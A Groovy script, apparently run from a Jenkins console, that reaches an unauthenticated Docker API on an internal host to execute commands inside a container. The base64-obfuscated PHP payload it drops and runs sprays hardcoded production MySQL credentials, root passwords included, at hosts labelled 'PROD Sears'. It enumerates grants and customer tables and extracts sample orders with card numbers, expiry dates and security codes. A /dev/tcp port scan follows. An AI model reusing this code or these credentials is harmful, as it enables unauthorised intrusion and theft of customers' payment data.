// Docker API → PHP → MySQL PROD Sears (bug fix: todas variables con def)
import groovy.json.JsonOutput
import groovy.json.JsonSlurper

def dockerApi = "http://172.27.140.148:4243"
def containerId = "5b32e909c295"

def httpPost = { String urlStr, String jsonBody ->
  def conn = (HttpURLConnection) new URL(urlStr).openConnection()
  conn.setRequestMethod("POST")
  conn.setDoOutput(true)
  conn.setConnectTimeout(8000)
  conn.setReadTimeout(90000)
  conn.setRequestProperty("Content-Type", "application/json")
  if (jsonBody) conn.getOutputStream().write(jsonBody.getBytes("UTF-8"))
  def code = conn.getResponseCode()
  def body = (code >= 400 ? conn.getErrorStream()?.getText("UTF-8") : conn.getInputStream().getText("UTF-8"))
  conn.disconnect()
  return [code: code, body: body]
}

def execIn = { String cmd ->
  def createBody = '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["/bin/bash","-c",' + JsonOutput.toJson(cmd) + ']}'
  def r1 = httpPost(dockerApi + "/containers/" + containerId + "/exec", createBody)
  if (r1.code != 201) return "EXEC_CREATE_FAIL HTTP ${r1.code}: ${r1.body}"
  def execId = new JsonSlurper().parseText(r1.body).Id
  def r2 = httpPost(dockerApi + "/exec/" + execId + "/start", '{"Detach":false,"Tty":true}')
  return r2.body
}

// PHP script to test MySQL to PROD Sears from inside container
def phpScript = '''<?php
$targets = [
  ["172.27.141.24", 3308, "dbcronproductos", "0c1A0ZW0Kh#wjqdRHV\$b63A", "tienda"],
  ["172.27.141.24", 3308, "dbsmartinsight",  "CD49uwg*iG9m5d+y",           "tienda"],
  ["172.27.141.24", 3308, "app_t1",          "jpTSf99UzLxC#t>",            "payment_t1"],
  ["172.27.141.24", 3308, "adaxxidb",        "JTQ6PrkecY3y1kVN",           "tienda"],
  ["172.27.141.24", 3308, "root",            "auroraboreal00",              "mysql"],
  ["172.27.141.24", 3308, "root",            "JenkisLegasy25",              "mysql"],
  ["172.27.141.24", 3308, "root",            "",                            "mysql"],
  ["172.27.141.4",  3310, "app_t1",          "wUt22Us2CUh#+M=",            "payment_t1"],
  ["172.27.141.4",  3310, "app_t1",          "jpTSf99UzLxC#t>",            "payment_t1"],
  ["172.27.141.4",  3310, "root",            "JenkisLegasy25",              "mysql"],
  ["172.27.141.4",  3310, "root",            "auroraboreal00",              "mysql"],
  ["172.27.141.4",  3306, "root",            "JenkisLegasy25",              "mysql"],
];

echo "=== SOURCE IP OF CONTAINER ===\\n";
echo trim(shell_exec("hostname -I 2>/dev/null | awk \'{print $1}\'")) . "\\n";

foreach ($targets as [$h,$p,$u,$pw,$db]) {
  echo "\\n--- $u@$h:$p [$db] ---\\n";
  $c = @new mysqli($h, $u, $pw, $db, $p);
  if ($c->connect_error) {
    echo "FAIL: " . $c->connect_error . "\\n";
    continue;
  }
  echo "AUTH_OK sv:" . $c->server_info . "\\n";
  $r = $c->query("SHOW GRANTS FOR CURRENT_USER()");
  if ($r) while ($row=$r->fetch_row()) echo "GRANT: ".$row[0]."\\n";
  $r = $c->query("SHOW DATABASES");
  if ($r) while ($row=$r->fetch_row()) echo "DB: ".$row[0]."\\n";
  
  // Count key tables
  foreach (["pedidos","clientes","clientescontrasena","datostarjeta","card","client","transaction","suscripciones"] as $t) {
    $r = $c->query("SELECT COUNT(*) FROM `$t`");
    if ($r) echo "COUNT($t)=" . $r->fetch_row()[0] . "\\n";
  }
  
  // Sample pedidos if readable  
  $r = $c->query("SELECT Id,Cliente,Fecha_Inicio,tipotarjeta,nombre,numero,mes,ao,seguridad,total FROM pedidos WHERE numero IS NOT NULL AND numero!=\'\' LIMIT 5");
  if ($r && $r->num_rows>0) {
    echo "PEDIDOS_SAMPLE:\\n";
    while ($row=$r->fetch_assoc()) echo json_encode($row)."\\n";
  }
  $c->close();
}
echo "\\nDONE\\n";
?>'''

def phpB64 = phpScript.getBytes("UTF-8").encodeBase64().toString()
def fullCmd = "echo '${phpB64}' | base64 -d > /tmp/_p.php && php /tmp/_p.php 2>&1; rm -f /tmp/_p.php"

println "=== DOCKER EXEC → PHP MySQL PROD Sears (FIXED) ==="
println execIn(fullCmd)

// Also probe TCP connectivity from container
def netCmd = '''
echo "=== TCP PROBE FROM CONTAINER ==="
for hp in "172.27.141.24:3308" "172.27.141.24:22" "172.27.141.4:3310" "172.27.141.4:3306" "172.27.140.151:3306"; do
  h="${hp%%:*}"; p="${hp#*:}"
  (timeout 3 bash -c "echo > /dev/tcp/$h/$p" 2>/dev/null && echo "OPEN|$hp") || echo "CLOSED|$hp"
done
echo "CONTAINER_IPs: $(hostname -I)"
'''
println "\n=== NETWORK PROBE FROM CONTAINER ==="
println execIn(netCmd)

println "=== FIN DOCKER FIXED ==="
